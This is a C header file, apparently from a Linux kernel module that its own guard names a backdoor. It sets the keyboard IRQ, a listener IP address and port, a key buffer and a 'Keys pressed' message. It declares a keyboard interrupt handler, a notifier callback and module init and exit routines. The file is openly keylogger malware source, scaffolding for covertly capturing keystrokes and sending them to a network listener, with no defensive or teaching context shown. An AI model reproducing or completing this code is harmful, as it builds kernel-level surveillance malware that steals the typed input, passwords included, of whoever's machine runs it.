#ifndef __BACKDOOR_H__
#define __BACKDOOR_H__


#define KBD_IQR 1 // Keyboard IRQ number.
#define IP_ADDRESS "127.0.0.1"
#define PORT 9095

#define KEY_BUFFER_SIZE 25
#define KEYLOGGER_MSG "Keys pressed: \0"

irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id);
int keyboard_notifier_callback(struct notifier_block *nblock, 
                               unsigned long code, void *_param);


// Insert and remove routines
static int __init keyboard_module_init(void);
static void __exit keyboard_module_exit(void);

#endif /* __BACKDOOR_H__ */
